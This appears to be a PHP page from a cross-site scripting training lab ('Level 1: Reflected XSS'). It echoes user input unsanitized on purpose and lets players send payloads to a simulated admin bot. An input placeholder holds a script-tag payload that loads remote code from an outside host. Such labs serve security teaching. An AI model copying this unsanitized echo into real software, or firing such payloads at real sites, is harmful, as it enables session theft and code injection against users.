<?php include '../headers.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 1 - Reflected XSS</title>
    <link rel="stylesheet" href="../assets/style.css">
</head>
<body>
    <div class="container">
        <div class="nav">
            <a href="../index.php">Home</a>
        </div>
        <h1 data-text="Level 1: Reflected XSS">Level 1: Reflected XSS</h1>
        <p>Your task: Inject a script to pop up an alert.</p>
        
        <form method="GET" action="">
            <input type="text" name="name" placeholder="Enter your name">
            <button type="submit">Submit</button>
        </form>
        
        <div class="message">
            <?php
            if (isset($_GET['name'])) {
                $name = $_GET['name'];
                // Vulnerability: No sanitization
                echo "Hello, " . $name . "!";
            }
            ?>
        </div>
        
        <div style="margin-top: 40px; border-top: 1px dashed var(--neon-cyan); padding-top: 20px;">
            <h3>Report to Admin</h3>
            <p>Found a vulnerability? Enter your payload below to notify the admin.</p>
            <div>
                <input type="text" id="payload-input" placeholder="<sCRiPt sRC=//xs.pe/6HW></sCrIpT>">
                <button onclick="AdminBot.send('level1', 'payload-input')">Send to Admin Bot</button>
            </div>
            <div style="margin-top: 10px; font-size: 12px; font-family: 'Share Tech Mono';">
                STATUS: <span id="bot-status" style="color: #666;">IDLE</span>
            </div>
        </div>
    </div>
    <script src="../assets/admin-bot.js"></script>
</body>
</html>